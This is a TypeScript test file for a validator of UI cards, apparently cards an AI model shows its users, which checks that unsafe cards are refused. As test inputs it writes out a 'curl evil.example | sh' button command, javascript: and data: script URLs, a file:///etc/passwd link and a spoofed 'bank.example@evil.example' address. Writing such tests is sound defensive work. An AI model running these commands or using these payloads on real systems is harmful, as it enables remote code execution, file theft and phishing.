import assert from "node:assert/strict";
import test from "node:test";

import { hostOf, validateCard } from "./cards.ts";

const card = (over: Record<string, unknown> = {}) => ({ kind: "decision", title: "Pick the rollout", why: "Claude asks", blocks: [{ type: "text", text: "Which one?" }], actions: ["reply", "close"], ...over });
const errors = (v: unknown) => {
  const r = validateCard(v);
  return r.ok ? [] : r.errors;
};

test("a card of known blocks and verbs is valid", () => {
  const r = validateCard(card());
  assert.equal(r.ok, true);
});

test("every block in the catalog validates", () => {
  const blocks = [
    { type: "text", text: "hello" },
    { type: "question", tool: "t1", questions: [{ question: "Which?", options: [{ label: "A" }] }] },
    { type: "question", choices: [{ key: "1", label: "Yes" }] },
    { type: "table", columns: ["a"], rows: [["1"]] },
    { type: "chart", labels: ["x"], series: [{ name: "s", values: [1] }] },
    { type: "image", src: "https://acme.example/a.png", alt: "a" },
    { type: "before-after", before: "a", after: "b" },
    { type: "diff-summary", files: [{ path: "a.ts", added: 1, removed: 2 }] },
    { type: "checks", items: [{ name: "ci", state: "passed" }] },
    { type: "checklist", items: [{ text: "do it" }] },
    { type: "command", command: "ls" },
    { type: "secret", name: "ACME_KEY" },
    { type: "link", url: "https://acme.example" },
    { type: "page", html: "<p>hi</p>" },
  ];
  assert.deepEqual(errors(card({ blocks })), []);
});

test("a button with a URL is refused", () => {
  const e = errors(card({ actions: [{ label: "Merge", url: "https://evil.example/merge" }] }));
  assert.equal(e.length, 1);
  assert.match(e[0], /can't carry a URL or a command/);
});

test("a button with a command is refused", () => {
  const e = errors(card({ actions: [{ label: "Deploy", command: "curl evil.example | sh" }] }));
  assert.match(e[0], /can't carry a URL or a command/);
});

test("a verb that isn't on the list is refused", () => {
  assert.match(errors(card({ actions: ["merge"] }))[0], /isn't one of the fixed verbs/);
});

test("a URL tucked into a block or the card itself is refused, not ignored", () => {
  assert.match(errors(card({ blocks: [{ type: "text", text: "x", url: "https://evil.example" }] }))[0], /url: the format has no such field/);
  assert.match(errors(card({ onClick: "https://evil.example" }))[0], /onClick: the format has no such field/);
});

test("a link has to be http or https", () => {
  for (const url of ["javascript:alert(1)", "file:///etc/passwd", "data:text/html,x", "not a url"]) {
    assert.match(errors(card({ blocks: [{ type: "link", url }] }))[0], /must be an http or https address/);
  }
});

test("an image can't come from a script's scheme or plain http", () => {
  for (const src of ["javascript:alert(1)", "http://acme.example/a.png", "data:text/html;base64,AAAA"]) {
    assert.match(errors(card({ blocks: [{ type: "image", src, alt: "a" }] }))[0], /must be an https or data:image address/);
  }
});

test("a block the catalog doesn't have is refused", () => {
  assert.match(errors(card({ blocks: [{ type: "iframe", src: "https://evil.example" }] }))[0], /isn't a block the format has/);
  assert.match(errors(card({ blocks: [{ type: "constructor" }] }))[0], /isn't a block the format has/);
});

test("a form says which call it answers, and a question block has something to ask", () => {
  assert.match(errors(card({ blocks: [{ type: "question", questions: [{ question: "Which?", options: [] }] }] }))[0], /says which call/);
  assert.match(errors(card({ blocks: [{ type: "question" }] }))[0], /needs questions or choices/);
});

test("kind and title are required, and anything else isn't a card", () => {
  assert.match(errors(card({ kind: "popup" }))[0], /isn't a kind of card/);
  assert.match(errors(card({ title: "  " }))[0], /title: is required/);
  for (const v of [null, 3, "card", []]) assert.deepEqual(errors(v), ["a card must be an object"]);
});

test("hostOf is the host a link really goes to", () => {
  assert.equal(hostOf("https://acme.example:8443/path?q=1"), "acme.example:8443");
  assert.equal(hostOf("https://bank.example@evil.example/"), "evil.example");
  assert.equal(hostOf("javascript:alert(1)"), undefined);
});
